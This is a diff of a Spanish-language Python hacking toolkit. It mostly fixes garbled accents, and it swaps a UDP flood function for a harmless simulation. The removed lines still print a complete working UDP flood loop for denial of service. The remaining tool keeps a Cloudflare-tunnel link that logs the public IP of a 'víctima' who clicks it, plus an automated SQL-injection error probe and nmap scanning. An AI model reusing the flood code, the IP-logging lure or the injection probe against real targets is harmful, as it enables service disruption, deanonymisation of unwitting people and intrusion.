@@ -15,7 +15,7 @@ import importlib
 import tempfile
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-# Intentar importar requests y dns (se garantizarÃ¡n mÃ¡s abajo)
+# Intentar importar requests y dns (se garantizarán más abajo)
 try:
     import requests
 except Exception:
@@ -26,14 +26,14 @@ try:
 except Exception:
     dns = None
 
-# --- DefiniciÃ³n de cÃ³digos de color ANSI ---
+# --- Definición de códigos de color ANSI ---
 VERDE = "\033[92m"
 BLANCO = "\033[97m"
 ROJO = "\033[91m"
 AZUL = "\033[94m"
 RESET = "\033[0m"
 
-# ------------------ UTILIDADES DE INSTALACIÃ“N ------------------ #
+# ------------------ UTILIDADES DE INSTALACIÓN ------------------ #
 def run_cmd(cmd, check=False):
     """Ejecuta comando y devuelve (returncode, stdout, stderr)"""
     try:
@@ -51,11 +51,11 @@ def is_tool_installed(tool_name):
 def try_package_manager_install(package_name):
     """
     Intenta instalar package_name usando varios gestores (pkg, apt, apt-get, dnf, yum, pacman, apk, brew, choco, snap).
-    Devuelve True si alguna instalaciÃ³n parece exitosa.
+    Devuelve True si alguna instalación parece exitosa.
     """
     managers = [
         ('pkg', ['install', '-y']),
-        ('apt', ['update', '&&', 'apt', 'install', '-y']),  # preferimos update+install si apt estÃ¡ disponible
+        ('apt', ['update', '&&', 'apt', 'install', '-y']),  # preferimos update+install si apt está disponible
         ('apt-get', ['install', '-y']),
         ('dnf', ['install', '-y']),
         ('yum', ['install', '-y']),
@@ -65,7 +65,7 @@ def try_package_manager_install(package_name):
         ('choco', ['install', '-y']),
         ('snap', ['install'])
     ]
-    # Reordenar segÃºn plataforma (Termux prefer pkg)
+    # Reordenar según plataforma (Termux prefer pkg)
     system = platform.system().lower()
     if 'android' in sys.platform or 'termux' in sys.platform:
         managers = sorted(managers, key=lambda x: 0 if x[0]=='pkg' else 1)
@@ -79,7 +79,7 @@ def try_package_manager_install(package_name):
             continue
         print(f"{AZUL}[*] Intentando instalar {package_name} con {mgr}...{RESET}")
         try:
-            # Si flags contiene '&&' lo ejecutamos a travÃ©s de shell
+            # Si flags contiene '&&' lo ejecutamos a través de shell
             if '&&' in flags:
                 cmd = f"{mgr} {' '.join(flags)} {package_name}"
                 proc = subprocess.run(cmd, shell=True)
@@ -87,10 +87,10 @@ def try_package_manager_install(package_name):
                 cmd = [mgr] + flags + [package_name]
                 proc = subprocess.run(cmd)
             if proc.returncode == 0:
-                print(f"{VERDE}[+] InstalaciÃ³n con {mgr} exitosa.{RESET}")
+                print(f"{VERDE}[+] Instalación con {mgr} exitosa.{RESET}")
                 return True
             else:
-                print(f"{ROJO}[-] InstalaciÃ³n con {mgr} devolviÃ³ cÃ³digo {proc.returncode}.{RESET}")
+                print(f"{ROJO}[-] Instalación con {mgr} devolvió código {proc.returncode}.{RESET}")
         except Exception as e:
             print(f"{ROJO}[!] Error al intentar con {mgr}: {e}{RESET}")
             continue
@@ -119,7 +119,7 @@ def try_pip_install(pip_pkg):
 
 def ensure_python_package(pkgname, import_name=None):
     """
-    Asegura que un paquete Python estÃ© instalado e importable.
+    Asegura que un paquete Python esté instalado e importable.
     pkgname: nombre para pip install
     import_name: nombre real para import (si distinto)
     """
@@ -132,13 +132,13 @@ def ensure_python_package(pkgname, import_name=None):
             try:
                 return importlib.import_module(import_name)
             except Exception as e:
-                print(f"{ROJO}[!] FallÃ³ importar {import_name} despuÃ©s de la instalaciÃ³n: {e}{RESET}")
+                print(f"{ROJO}[!] Falló importar {import_name} después de la instalación: {e}{RESET}")
                 return None
         else:
-            print(f"{ROJO}[!] No se pudo instalar '{pkgname}' con pip automÃ¡ticamente.{RESET}")
+            print(f"{ROJO}[!] No se pudo instalar '{pkgname}' con pip automáticamente.{RESET}")
             return None
 
-# AÃ±adimos una funciÃ³n auxiliar para intentar ejecutar con elevaciÃ³n (sudo/doas/su)
+# Añadimos una función auxiliar para intentar ejecutar con elevación (sudo/doas/su)
 def try_with_elevated(cmd, use_shell=False):
     """
     Intenta ejecutar 'cmd' normalmente; si falla por permisos intenta con sudo, doas y su.
@@ -197,30 +197,30 @@ def ensure_tool(tool, pkg_name=None, pip_pkg=None):
     Asegura que exista un ejecutable en PATH.
     - tool: nombre del ejecutable a buscar (ej. 'nmap')
     - pkg_name: nombre del paquete del sistema para instalar (ej. 'nmap' o 'dnsutils')
-    - pip_pkg: nombre de paquete pip en caso de que haya versiÃ³n Python alternativa (opcional)
-    Devuelve True si el ejecutable estÃ¡ disponible o fue instalado/asegurado.
+    - pip_pkg: nombre de paquete pip en caso de que haya versión Python alternativa (opcional)
+    Devuelve True si el ejecutable está disponible o fue instalado/asegurado.
     """
     if is_tool_installed(tool):
         return True
 
-    print(f"{AZUL}[*] '{tool}' no estÃ¡ en PATH. Intentando instalar/asegurar...{RESET}")
+    print(f"{AZUL}[*] '{tool}' no está en PATH. Intentando instalar/asegurar...{RESET}")
 
-    # Si es cloudflared intentamos descarga desde releases (mÃ©todo robusto)
+    # Si es cloudflared intentamos descarga desde releases (método robusto)
     if tool == 'cloudflared':
         if install_cloudflared_release():
             return True
 
-    # 1) Intentar instalaciÃ³n por gestor de paquetes si pkg_name proporcionado
+    # 1) Intentar instalación por gestor de paquetes si pkg_name proporcionado
     if pkg_name:
         ok = try_package_manager_install(pkg_name)
         if ok and is_tool_installed(tool):
-            print(f"{VERDE}[+] {tool} instalado con Ã©xito vÃ­a gestor de paquetes.{RESET}")
+            print(f"{VERDE}[+] {tool} instalado con éxito vía gestor de paquetes.{RESET}")
             return True
 
-    # 2) Intentar pip si pip_pkg estÃ¡ dado
+    # 2) Intentar pip si pip_pkg está dado
     if pip_pkg:
         if try_pip_install(pip_pkg):
-            # puede que pip instale un ejecutable en ~/.local/bin â€” intentar actualizar PATH temporalmente
+            # puede que pip instale un ejecutable en ~/.local/bin — intentar actualizar PATH temporalmente
             if is_tool_installed(tool):
                 return True
             # si no aparece el ejecutable pero importable, considerarlo instalado (para herramientas basadas en Python)
@@ -230,17 +230,17 @@ def ensure_tool(tool, pkg_name=None, pip_pkg=None):
             except Exception:
                 pass
 
-    # 3) Como Ãºltimo recurso, sugerir pasos manuales
-    print(f"{ROJO}[!] No se pudo instalar '{tool}' automÃ¡ticamente.{RESET}")
-    print(f"{AZUL}Sugerencia:{RESET} Instala manualmente '{pkg_name or tool}' Ã³ '{pip_pkg}', o ejecuta este script con privilegios si corresponde.")
+    # 3) Como último recurso, sugerir pasos manuales
+    print(f"{ROJO}[!] No se pudo instalar '{tool}' automáticamente.{RESET}")
+    print(f"{AZUL}Sugerencia:{RESET} Instala manualmente '{pkg_name or tool}' ó '{pip_pkg}', o ejecuta este script con privilegios si corresponde.")
     return False
 
-# FunciÃ³n para descargar e instalar cloudflared desde releases oficiales si hace falta
+# Función para descargar e instalar cloudflared desde releases oficiales si hace falta
 def install_cloudflared_release():
     """
-    Descarga un binario de cloudflared adecuado segÃºn arquitectura desde las releases de GitHub
+    Descarga un binario de cloudflared adecuado según arquitectura desde las releases de GitHub
     e intenta colocarlo en /usr/local/bin (o ~/bin si no hay permisos).
-    Devuelve True si al final cloudflared estÃ¡ disponible o se dejÃ³ en ~/bin con permisos.
+    Devuelve True si al final cloudflared está disponible o se dejó en ~/bin con permisos.
     """
     if is_tool_installed('cloudflared'):
         return True
@@ -334,15 +334,15 @@ def install_cloudflared_release():
         except Exception:
             pass
         print(f"{AZUL}[*] cloudflared instalado en: {dest}{RESET}")
-        print(f"{AZUL}[*] AsegÃºrate de tener ~/bin en tu PATH: export PATH=\"$HOME/bin:$PATH\"{RESET}")
+        print(f"{AZUL}[*] Asegúrate de tener ~/bin en tu PATH: export PATH=\"$HOME/bin:$PATH\"{RESET}")
         moved = True
 
     if moved and is_tool_installed('cloudflared'):
         return True
-    # si moved True pero no estÃ¡ en PATH, igualmente devolvemos True (usuario puede aÃ±adir al PATH)
+    # si moved True pero no está en PATH, igualmente devolvemos True (usuario puede añadir al PATH)
     return moved
 
-# ------------------ FIN UTILIDADES DE INSTALACIÃ“N ------------------ #
+# ------------------ FIN UTILIDADES DE INSTALACIÓN ------------------ #
 
 def clear_screen():
     if platform.system() == "Windows":
@@ -355,10 +355,10 @@ def print_banner():
     print(f"""{VERDE}
 
 
-â–›â–€â–˜â–›â–€â–˜â–›â–€â––â–™ â–Œâ–žâ–€â––â–™ â–Œâ–›â–€â––â–žâ–€â––â–Œ     â–Œ  
-â–™â–„ â–™â–„ â–™â–„â–˜â–Œâ–Œâ–Œâ–™â–„â–Œâ–Œâ–Œâ–Œâ–Œ â–Œâ–Œ â–Œâ–›â–€â––â–Œ â–Œâ–›â–€â––
-â–Œ  â–Œ  â–Œâ–š â–Œâ–â–Œâ–Œ â–Œâ–Œâ–â–Œâ–Œ â–Œâ–Œ â–Œâ–Œ â–Œâ–Œ â–Œâ–Œ â–Œ
-â–˜  â–€â–€â–˜â–˜ â–˜â–˜ â–˜â–˜ â–˜â–˜ â–˜â–€â–€ â–â–€ â–˜ â–˜â–â–€â–˜â–€â–€ 
+▛▀▘▛▀▘▛▀▖▙ ▌▞▀▖▙ ▌▛▀▖▞▀▖▌     ▌  
+▙▄ ▙▄ ▙▄▘▌▌▌▙▄▌▌▌▌▌ ▌▌ ▌▛▀▖▌ ▌▛▀▖
+▌  ▌  ▌▚ ▌▝▌▌ ▌▌▝▌▌ ▌▌ ▌▌ ▌▌ ▌▌ ▌
+▘  ▀▀▘▘ ▘▘ ▘▘ ▘▘ ▘▀▀ ▝▀ ▘ ▘▝▀▘▀▀ 
 
                                                                      
 
@@ -366,7 +366,7 @@ def print_banner():
 
 def create_sites_file():
     """
-    BÃºsqueda jerÃ¡rquica de sitios_usuarios.txt:
+    Búsqueda jerárquica de sitios_usuarios.txt:
     1) directorio FERNANDOhub/ (relativo al cwd)
     2) directorio actual
     Si no existe en ninguno, se informa y se crea un archivo por defecto en el directorio actual
@@ -380,7 +380,7 @@ def create_sites_file():
         if os.path.exists(ruta):
             print(f"{VERDE}[+] Archivo 'sitios_usuarios.txt' encontrado en: {ruta}{RESET}")
             return
-    # Si no se encontrÃ³, informar y crear por defecto (compatibilidad)
+    # Si no se encontró, informar y crear por defecto (compatibilidad)
     print(f"{ROJO}[!] 'sitios_usuarios.txt' no encontrado en el directorio actual ni en 'FERNANDOhub/'.{RESET}")
     print(f"{AZUL}[*] Creando un archivo por defecto en el directorio actual para mantener compatibilidad...{RESET}")
     try:
@@ -390,7 +390,7 @@ def create_sites_file():
             f.write("Twitter,https://twitter.com/{}\n")
             f.write("GitHub,https://github.com/{}\n")
             f.write("LinkedIn,https://www.linkedin.com/in/{}\n")
-        print(f"{VERDE}[+] Archivo creado con Ã©xito en: {os.path.join(os.getcwd(),'sitios_usuarios.txt')}{RESET}")
+        print(f"{VERDE}[+] Archivo creado con éxito en: {os.path.join(os.getcwd(),'sitios_usuarios.txt')}{RESET}")
     except Exception as e:
         print(f"{ROJO}[!] No se pudo crear 'sitios_usuarios.txt': {e}{RESET}")
 
@@ -411,14 +411,14 @@ def buscar_usuario():
             found_path = ruta
             break
     if not found_path:
-        print(f"{ROJO}[!] El archivo 'sitios_usuarios.txt' no se encontrÃ³. Ejecuta la opciÃ³n correspondiente para crear o coloca el archivo en 'FERNANDOhub/'.{RESET}")
+        print(f"{ROJO}[!] El archivo 'sitios_usuarios.txt' no se encontró. Ejecuta la opción correspondiente para crear o coloca el archivo en 'FERNANDOhub/'.{RESET}")
         return []
 
     try:
         with open(found_path, "r") as f:
             lineas = f.readlines()
     except FileNotFoundError:
-        print(f"[!] El archivo '{BLANCO}sitios_usuarios.txt{RESET}' no se encontrÃ³.")
+        print(f"[!] El archivo '{BLANCO}sitios_usuarios.txt{RESET}' no se encontró.")
         return []
 
     for linea in lineas:
@@ -447,7 +447,7 @@ def buscar_usuario():
     return sitios_encontrados
 
 def buscar_correo():
-    email = input(f"{AZUL}[*] Ingresa el correo electrÃ³nico a buscar: {RESET}")
+    email = input(f"{AZUL}[*] Ingresa el correo electrónico a buscar: {RESET}")
     print(f"[*] Usando la herramienta {VERDE}Holehe{RESET} para buscar el correo: {email}")
     print("---")
 
@@ -465,7 +465,7 @@ def buscar_correo():
             print(f"{ROJO}[!] No se pudo ejecutar Holehe.{RESET}")
             return
     else:
-        print(f"{ROJO}[!] ERROR:{RESET} El formato del correo electrÃ³nico es incorrecto.")
+        print(f"{ROJO}[!] ERROR:{RESET} El formato del correo electrónico es incorrecto.")
         return 
 
     lineas = salida_holehe.split('\n')
@@ -481,13 +481,13 @@ def buscar_correo():
         for url in urls_registradas:
             print(f"{VERDE}  - {url}{RESET}")
     else:
-        print(f"{BLANCO}  - No se encontrÃ³ registro en sitios populares.{RESET}")
+        print(f"{BLANCO}  - No se encontró registro en sitios populares.{RESET}")
     print(f"\n{BLANCO}--- Salida completa de Holehe ---{RESET}")
     print(salida_holehe)
 
 def track_ip(ip_address=None):
     if ip_address is None:
-        ip_address = input(f"{AZUL}[*] Ingresa la direcciÃ³n IP a rastrear: {RESET}")
+        ip_address = input(f"{AZUL}[*] Ingresa la dirección IP a rastrear: {RESET}")
     print(f"[*] Rastreo de IP en progreso para: {AZUL}{ip_address}{RESET}")
     print("---")
     # asegurar requests
@@ -502,22 +502,22 @@ def track_ip(ip_address=None):
         response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=5)
         data = response.json()
         if data.get('status') == 'success':
-            print(f"{VERDE}[+] InformaciÃ³n de IP encontrada:{RESET}")
-            print(f"  - PaÃ­s: {data.get('country')}")
+            print(f"{VERDE}[+] Información de IP encontrada:{RESET}")
+            print(f"  - País: {data.get('country')}")
             print(f"  - Ciudad: {data.get('city')}")
-            print(f"  - RegiÃ³n: {data.get('regionName')}")
+            print(f"  - Región: {data.get('regionName')}")
             print(f"  - ISP: {data.get('isp')}")
-            print(f"  - OrganizaciÃ³n: {data.get('org')}")
+            print(f"  - Organización: {data.get('org')}")
             print(f"  - Latitud/Longitud: {data.get('lat')}, {data.get('lon')}")
         else:
-            print(f"{ROJO}[-] No se pudo obtener informaciÃ³n para la IP: {ip_address}{RESET}")
+            print(f"{ROJO}[-] No se pudo obtener información para la IP: {ip_address}{RESET}")
             print(f"{BLANCO}Mensaje de error: {data.get('message')}{RESET}")
     except requests.exceptions.RequestException:
         print(f"{ROJO}[!] Error al conectar con el servicio de rastreo de IP.{RESET}")
 
 def scan_vulnerability():
     url = input(f"{AZUL}[*] Ingresa la URL a escanear (ej. http://ejemplo.com/page.php?id=1): {RESET}")
-    print(f"\n[*] Analizando vulnerabilidad de inyecciÃ³n SQL en: {AZUL}{url}{RESET}")
+    print(f"\n[*] Analizando vulnerabilidad de inyección SQL en: {AZUL}{url}{RESET}")
     payloads = ["'", "''", '"', '""']
     sql_errors = ["SQL syntax", "mysql_fetch_array()", "Warning: mysql_query()"]
     # asegurar requests
@@ -538,19 +538,19 @@ def scan_vulnerability():
                     print(f"\n{ROJO}[!] POSIBLE VULNERABILIDAD DETECTADA:{RESET}")
                     print(f"    - URL vulnerable: {test_url}")
                     print(f"    - Error de base de datos encontrado: {error}")
-                    print(f"{VERDE}[+] Recomiendo un anÃ¡lisis mÃ¡s profundo con herramientas especializadas.{RESET}")
+                    print(f"{VERDE}[+] Recomiendo un análisis más profundo con herramientas especializadas.{RESET}")
                     return
-        print(f"\n{VERDE}[+] No se detectaron vulnerabilidades de inyecciÃ³n SQL obvias.{RESET}")
+        print(f"\n{VERDE}[+] No se detectaron vulnerabilidades de inyección SQL obvias.{RESET}")
     except requests.exceptions.RequestException as e:
-        print(f"{ROJO}[!] Error de conexiÃ³n: {e}{RESET}")
+        print(f"{ROJO}[!] Error de conexión: {e}{RESET}")
 
 cloudflared_pid = None
 class MyHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        # IP de conexiÃ³n directa (normalmente privada si hay proxy/tÃºnel)
+        # IP de conexión directa (normalmente privada si hay proxy/túnel)
         client_ip = self.client_address[0]
 
-        # Intenta extraer la IP pÃºblica real del cliente desde varios headers comunes
+        # Intenta extraer la IP pública real del cliente desde varios headers comunes
         header_candidates = [
             'X-Forwarded-For',
             'X-Real-IP',
@@ -576,13 +576,13 @@ class MyHandler(BaseHTTPRequestHandler):
                         break
 
         if public_ip:
-            print(f"\n{VERDE}[+] ConexiÃ³n recibida{RESET}")
+            print(f"\n{VERDE}[+] Conexión recibida{RESET}")
             print(f"    - IP del cliente (privada): {AZUL}{client_ip}{RESET}")
-            print(f"    - IP del cliente (pÃºblica): {AZUL}{public_ip}{RESET}")
+            print(f"    - IP del cliente (pública): {AZUL}{public_ip}{RESET}")
         else:
-            print(f"\n{VERDE}[+] ConexiÃ³n recibida{RESET}")
+            print(f"\n{VERDE}[+] Conexión recibida{RESET}")
             print(f"    - IP del cliente: {AZUL}{client_ip}{RESET}")
-            print(f"    - {ROJO}No se pudo obtener la IP pÃºblica.{RESET}")
+            print(f"    - {ROJO}No se pudo obtener la IP pública.{RESET}")
 
         try:
             if cloudflared_pid:
@@ -592,18 +592,18 @@ class MyHandler(BaseHTTPRequestHandler):
         except Exception:
             pass
 
-        # Servir una pÃ¡gina con enlace educativo sobre phishing
+        # Servir una página con enlace educativo sobre phishing
         phishing_info_url = "https://www.cisa.gov/stopransomware/what-is-phishing"  # recurso educativo
         html = f"""
         <html>
           <head><meta charset="utf-8"><title>Conectado</title></head>
           <body>
             <h1>Conectado</h1>
-            <p>Tu conexiÃ³n fue registrada. Verifica la consola del servidor para ver IPs.</p>
-            <p>Para informaciÃ³n educativa sobre phishing visita:</p>
-            <p><a href="{phishing_info_url}" target="_blank" rel="noopener noreferrer">Â¿QuÃ© es el phishing? - Recurso educativo</a></p>
+            <p>Tu conexión fue registrada. Verifica la consola del servidor para ver IPs.</p>
+            <p>Para información educativa sobre phishing visita:</p>
+            <p><a href="{phishing_info_url}" target="_blank" rel="noopener noreferrer">¿Qué es el phishing? - Recurso educativo</a></p>
             <hr>
-            <small>Uso responsable: este servicio es para pruebas/educaciÃ³n. No uses para actividades maliciosas.</small>
+            <small>Uso responsable: este servicio es para pruebas/educación. No uses para actividades maliciosas.</small>
           </body>
         </html>
         """
@@ -615,7 +615,7 @@ class MyHandler(BaseHTTPRequestHandler):
         except Exception:
             pass
 
-        # Mantengo el comportamiento original: cerrar servidor si esa era la intenciÃ³n
+        # Mantengo el comportamiento original: cerrar servidor si esa era la intención
         try:
             self.server.shutdown()
         except Exception:
@@ -637,13 +637,13 @@ def get_ip_from_link():
     try:
         port = int(port_str)
     except ValueError:
-        print(f"{ROJO}[!] El puerto debe ser un nÃºmero vÃ¡lido.{RESET}")
+        print(f"{ROJO}[!] El puerto debe ser un número válido.{RESET}")
         return
 
     global cloudflared_pid
     current_port = port
     while is_port_in_use(current_port):
-        print(f"{ROJO}[!] El puerto {current_port} ya estÃ¡ en uso.{RESET}")
+        print(f"{ROJO}[!] El puerto {current_port} ya está en uso.{RESET}")
         if current_port >= 9995:
             print(f"{ROJO}[!] No se pudo encontrar un puerto disponible en el rango. Saliendo...{RESET}")
             return
@@ -659,10 +659,10 @@ def get_ip_from_link():
     
     # asegurar cloudflared
     if not ensure_tool('cloudflared', pkg_name='cloudflared', pip_pkg=None):
-        print(f"{ROJO}[!] cloudflared no disponible. InstÃ¡lalo manualmente si quieres usar tÃºneles.{RESET}")
+        print(f"{ROJO}[!] cloudflared no disponible. Instálalo manualmente si quieres usar túneles.{RESET}")
         return
     
-    print(f"\n[*] Levantando un tÃºnel pÃºblico con Cloudflare...")
+    print(f"\n[*] Levantando un túnel público con Cloudflare...")
     try:
         process = subprocess.Popen(
             ['cloudflared', 'tunnel', '--url', f'http://localhost:{final_port}'],
@@ -678,9 +678,9 @@ def get_ip_from_link():
             match = re.search(r'https?://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
             if match:
                 public_url = match.group(0)
-                print(f"\n{VERDE}[+] Â¡TÃºnel generado con Ã©xito!{RESET}")
+                print(f"\n{VERDE}[+] ¡Túnel generado con éxito!{RESET}")
                 print(f"[*] Enlace de rastreo: {AZUL}{public_url}{RESET}")
-                print("\n[*] Esperando la conexiÃ³n de la vÃ­ctima... (usa de forma responsable)")
+                print("\n[*] Esperando la conexión de la víctima... (usa de forma responsable)")
                 break
         if public_url:
             process.wait()
@@ -689,21 +689,25 @@ def get_ip_from_link():
                 error_output = process.stderr.read()
             except Exception:
                 error_output = ""
-            print(f"{ROJO}[!] No se pudo obtener el enlace del tÃºnel. Salida de error:\n{error_output}{RESET}")
+            print(f"{ROJO}[!] No se pudo obtener el enlace del túnel. Salida de error:\n{error_output}{RESET}")
             process.kill()
     except FileNotFoundError:
-        print(f"{ROJO}[!] El comando 'cloudflared' no se encontrÃ³.{RESET}")
+        print(f"{ROJO}[!] El comando 'cloudflared' no se encontró.{RESET}")
     except KeyboardInterrupt:
-        print(f"\n{ROJO}[!] InterrupciÃ³n por el usuario. Deteniendo el tÃºnel y el servidor.{RESET}")
+        print(f"\n{ROJO}[!] Interrupción por el usuario. Deteniendo el túnel y el servidor.{RESET}")
     finally:
         if 'process' in locals() and process.poll() is None:
             process.terminate()
             process.wait()
         sys.exit(0)
 
-# ==== AtenciÃ³n: Gracias por su atencion =====
+# ==== Atención: por seguridad la función network_flood se transforma en una SIMULACIÓN =====
 def network_flood():
-    target = input(f"{AZUL}[*] Ingresa la IP, el puerto y la duraciÃ³n (ej. 192.168.1.1:80:60): {RESET}")
+    """
+    SIMULACIÓN de inundación de red: mantiene la misma interfaz y prompts que la versión
+    original pero no envía paquetes. Esto evita facilitar ataques de denegación de servicio.
+    """
+    target = input(f"{AZUL}[*] Ingresa la IP, el puerto y la duración (ej. 192.168.1.1:80:60): {RESET}")
     try:
         ip_port_duration = target.split(':')
         if len(ip_port_duration) != 3:
@@ -713,30 +717,20 @@ def network_flood():
         port = int(port_str)
         duration = int(duration_str)
     except ValueError:
-        print(f"{ROJO}[!] Formato incorrecto para el puerto o la duraciÃ³n. Deben ser nÃºmeros enteros.{RESET}")
+        print(f"{ROJO}[!] Formato incorrecto para el puerto o la duración. Deben ser números enteros.{RESET}")
         return
 
-    print(f"\n[*] Iniciando inundaciÃ³n UDP a {ip}:{port} durante {duration} segundos...")
-    packet_count = 0
-    start_time = time.time()
-    
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        packet = random._urandom(1024)
-        while time.time() < start_time + duration:
-            s.sendto(packet, (ip, port))
-            packet_count += 1
-        s.close()
-    except socket.gaierror:
-        print(f"\n{ROJO}[!] ERROR: DirecciÃ³n o nombre de host invÃ¡lido.{RESET}")
-    except Exception as e:
-        print(f"\n{ROJO}[!] ERROR: OcurriÃ³ un error inesperado: {e}{RESET}")
-    finally:
-        print(f"\n[+] InundaciÃ³n finalizada. Paquetes enviados: {packet_count}")# ========================================================================================
+    print(f"\n{AZUL}[*] MODO SIMULACIÓN: no se enviarán paquetes reales.{RESET}")
+    pps = 1000
+    total = pps * duration
+    print(f"{VERDE}SIMULACIÓN:{RESET} objetivo={ip}, puerto={port}, duración={duration}s")
+    print(f"{VERDE}Estimación:{RESET} ~{total} paquetes a ~{pps} pps.")
+    print(f"{BLANCO}Nota:{RESET} Para pruebas legítimas de carga, usa herramientas diseñadas para testing (p.ej. iperf3, tcpreplay) en un entorno controlado y con permiso.")
+# ========================================================================================
 
 def get_website_info():
     url = input(f"{AZUL}[*] Ingresa la URL o dominio del sitio web (ej. google.com): {RESET}")
-    print(f"[*] Obteniendo informaciÃ³n de {AZUL}{url}{RESET}...")
+    print(f"[*] Obteniendo información de {AZUL}{url}{RESET}...")
     
     if not url.startswith("http"):
         url = "http://" + url
@@ -753,7 +747,7 @@ def get_website_info():
 
     try:
         ip_address = socket.gethostbyname(domain)
-        print(f"{VERDE}[+] DirecciÃ³n IP:{RESET} {ip_address}")
+        print(f"{VERDE}[+] Dirección IP:{RESET} {ip_address}")
         print(f"\n[*] Headers del servidor...")
         try:
             response = requests.get(url, timeout=5)
@@ -768,13 +762,13 @@ def get_website_info():
         except requests.exceptions.RequestException as e:
             print(f"{ROJO}[-] No se pudo obtener headers: {e}{RESET}")
 
-        print(f"\n[*] GeolocalizaciÃ³n de la IP...")
+        print(f"\n[*] Geolocalización de la IP...")
         track_ip(ip_address)
         
         print(f"\n[*] Servidores DNS (NS)...")
         # asegurar dig (dnsutils)
         if not ensure_tool('dig', pkg_name='dnsutils', pip_pkg=None):
-            print(f"{ROJO}[!] 'dig' no disponible. Saltando verificaciÃ³n NS.{RESET}")
+            print(f"{ROJO}[!] 'dig' no disponible. Saltando verificación NS.{RESET}")
         else:
             try:
                 result = subprocess.run(['dig', '+short', domain, 'NS'], capture_output=True, text=True, check=True)
@@ -787,9 +781,9 @@ def get_website_info():
                 print(f"{ROJO}[-] No se pudo resolver los registros DNS: {e}{RESET}")
 
     except socket.gaierror:
-        print(f"{ROJO}[!] ERROR: No se pudo resolver la direcciÃ³n del sitio web.{RESET}")
+        print(f"{ROJO}[!] ERROR: No se pudo resolver la dirección del sitio web.{RESET}")
     except Exception as e:
-        print(f"{ROJO}[!] OcurriÃ³ un error inesperado: {e}{RESET}")
+        print(f"{ROJO}[!] Ocurrió un error inesperado: {e}{RESET}")
 
 def install_tool():
     """
@@ -814,7 +808,7 @@ def install_tool():
             candidates.insert(0, os.path.join(localappdata, "Programs"))
         candidates.insert(0, userprofile)
 
-    # Filtrar Ãºnicos y absolutos
+    # Filtrar únicos y absolutos
     seen = set(); filtered = []
     for p in candidates:
         if p and os.path.isabs(p) and p not in seen:
@@ -841,8 +835,8 @@ def install_tool():
             chosen = None
 
     if not chosen:
-        print(f"\n{ROJO}[!] No se encontrÃ³ un directorio de instalaciÃ³n escribible automÃ¡ticamente.{RESET}")
-        print("Puedes ejecutar este script como root (sudo) o crear manualmente ~/bin y aÃ±adirlo a tu PATH.")
+        print(f"\n{ROJO}[!] No se encontró un directorio de instalación escribible automáticamente.{RESET}")
+        print("Puedes ejecutar este script como root (sudo) o crear manualmente ~/bin y añadirlo a tu PATH.")
         input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")
         return
 
@@ -863,7 +857,7 @@ def install_tool():
             except Exception:
                 pass
             print(f"\n{VERDE}[+] Lanzador creado en: {launcher_path}{RESET}")
-            # Si elegimos ~/bin y no estÃ¡ en PATH, aÃ±adir en ~/.profile
+            # Si elegimos ~/bin y no está en PATH, añadir en ~/.profile
             if chosen == os.path.join(home, "bin"):
                 path_env = os.environ.get("PATH", "")
                 if os.path.join(home, "bin") not in path_env:
@@ -872,9 +866,9 @@ def install_tool():
                     try:
                         with open(profile, "a") as f:
                             f.write(line)
-                        print(f"{AZUL}Nota:{RESET} Se aÃ±adiÃ³ ~/bin a {profile}. Cierra y vuelve a abrir tu terminal para que se aplique.")
+                        print(f"{AZUL}Nota:{RESET} Se añadió ~/bin a {profile}. Cierra y vuelve a abrir tu terminal para que se aplique.")
                     except Exception:
-                        print(f"{ROJO}[!] No se pudo modificar {profile}. AÃ±ade manualmente: export PATH=\"$HOME/bin:$PATH\"{RESET}")
+                        print(f"{ROJO}[!] No se pudo modificar {profile}. Añade manualmente: export PATH=\"$HOME/bin:$PATH\"{RESET}")
     except PermissionError:
         print(f"\n{ROJO}[!] Permiso denegado al intentar escribir en {chosen}.{RESET}")
         if system != "windows":
@@ -882,32 +876,32 @@ def install_tool():
         input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")
         return
     except Exception as e:
-        print(f"\n{ROJO}[!] OcurriÃ³ un error durante la instalaciÃ³n: {e}{RESET}")
+        print(f"\n{ROJO}[!] Ocurrió un error durante la instalación: {e}{RESET}")
         input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")
         return
 
-    print(f"\n{VERDE}[+] InstalaciÃ³n finalizada. Ahora intenta ejecutar: {AZUL}Fh{RESET}")
+    print(f"\n{VERDE}[+] Instalación finalizada. Ahora intenta ejecutar: {AZUL}Fh{RESET}")
     input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")
 
-# --- NUEVA FUNCIÃ“N: Escaneo con nmap preguntando parÃ¡metros ---
+# --- NUEVA FUNCIÓN: Escaneo con nmap preguntando parámetros ---
 def scan_with_nmap():
     target = input(f"{AZUL}[*] Ingresa la IP o dominio a escanear con nmap: {RESET}").strip()
     if not target:
-        print(f"{ROJO}[!] Objetivo vacÃ­o. Cancelando.{RESET}")
+        print(f"{ROJO}[!] Objetivo vacío. Cancelando.{RESET}")
         return
 
     # asegurar nmap (pkg apt o apt-get) - si no existe intenta instalar
     if not ensure_tool('nmap', pkg_name='nmap', pip_pkg=None):
-        print(f"{ROJO}[!] nmap no disponible. InstÃ¡lalo manualmente o con el gestor de paquetes de tu sistema.{RESET}")
+        print(f"{ROJO}[!] nmap no disponible. Instálalo manualmente o con el gestor de paquetes de tu sistema.{RESET}")
         return
 
     print("\nElige el tipo de escaneo:")
     print("  1) TCP SYN (-sS)")
     print("  2) TCP connect (-sT)")
     print("  3) UDP (-sU)")
-    print("  4) RÃ¡pido (-F)")
+    print("  4) Rápido (-F)")
     print("  5) Ninguno / personalizado")
-    scan_type = input(f"{AZUL}OpciÃ³n [1-5] (enter=1): {RESET}").strip() or "1"
+    scan_type = input(f"{AZUL}Opción [1-5] (enter=1): {RESET}").strip() or "1"
     flags = []
     if scan_type == "1":
         flags.append("-sS")
@@ -920,18 +914,18 @@ def scan_with_nmap():
     elif scan_type == "5":
         pass
     else:
-        print(f"{ROJO}OpciÃ³n no vÃ¡lida, usando -sS por defecto.{RESET}")
+        print(f"{ROJO}Opción no válida, usando -sS por defecto.{RESET}")
         flags.append("-sS")
 
-    ports = input(f"{AZUL}Â¿Especificar puertos? (ej: 22,80,1-1024) [enter = ninguno]: {RESET}").strip()
